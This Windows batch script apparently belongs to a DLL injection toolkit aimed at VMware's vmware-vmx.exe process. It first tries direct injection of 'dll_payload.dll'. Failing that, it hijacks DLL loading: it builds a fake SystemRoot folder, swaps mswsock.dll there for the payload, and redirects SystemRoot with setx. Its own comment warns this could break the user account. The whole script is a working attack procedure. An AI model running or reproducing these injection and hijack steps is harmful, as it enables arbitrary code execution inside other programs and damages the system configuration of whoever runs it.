@echo off

echo user
whoami

echo kill all vmware-vmx.exe
simple_injection.exe vmware-vmx.exe

echo remove lock files
cd dummie_vm
for /d %%G in ("%~dp0dummie_vm\*lck") do rd /s /q "%%~G"
cd ..

echo start vm - continue after vm machine is running, vmware-vmx.exe
:vmrun.exe start "%~dp0dummie_vm\dummie_vm.vmx"
start cmd /c "start %~dp0dummie_vm\dummie_vm.vmx && EXIT"

: wait for 15 seconds
ping 127.0.0.1 -n 15 > nul
PAUSE

echo try simple injection
simple_injection.exe vmware-vmx.exe "%~dp0dll_payload.dll" dummie_vm
IF %ERRORLEVEL% EQU 0 (

echo injection failed, trying dll hack

echo kill all vmware.exe, vmplayer.exe, vmware-vmx.exe

start simple_injection.exe vmware.exe
start simple_injection.exe vmplayer.exe
simple_injection.exe vmware-vmx.exe

echo create local systemroot
mkdir "%~dp0wnd"
mkdir "%~dp0wnd\System32"

echo copy some systemroot files in case of __fix_systemroot.cmd fail account wont get brick

copy %SystemRoot%\System32\*.dll "%~dp0wnd\System32\" > NUL
copy %SystemRoot%\System32\*.exe "%~dp0wnd\System32\" > NUL
copy %SystemRoot%\*.exe "%~dp0wnd\" > NUL
copy %SystemRoot%\*.dll "%~dp0wnd\" > NUL
del \F \Q "%~dp0wnd\System32\mswsock.dll"
copy dll_payload.dll "%~dp0wnd\System32\mswsock.dll"

echo setx SystemRoot to local
setx SystemRoot %~dp0wnd

echo start systemroot fixer
start __fix_systemroot.cmd

echo starting vm - continue after vm machine is running, vmware-vmx.exe

:vmrun.exe start "%~dp0dummie_vm\dummie_vm.vmx"
start cmd /c "start %~dp0dummie_vm\dummie_vm.vmx && EXIT"

ping 127.0.0.1 -n 10 > nul
PAUSE

) ELSE (
echo please rest dummie_vm
:start vmrun.exe reset "%~dp0dummie_vm\dummie_vm.vmx"
PAUSE

echo wait 3 seconds
ping 127.0.0.1 -n 3 > nul
echo killing vmware.exe
echo killing vmplayer.exe
echo killing vmware-vmx.exe
ping 127.0.0.1 -n 0 > nul
start simple_injection.exe vmware.exe
start simple_injection.exe vmplayer.exe
simple_injection.exe vmware-vmx.exe
)


echo user
whoami

PAUSE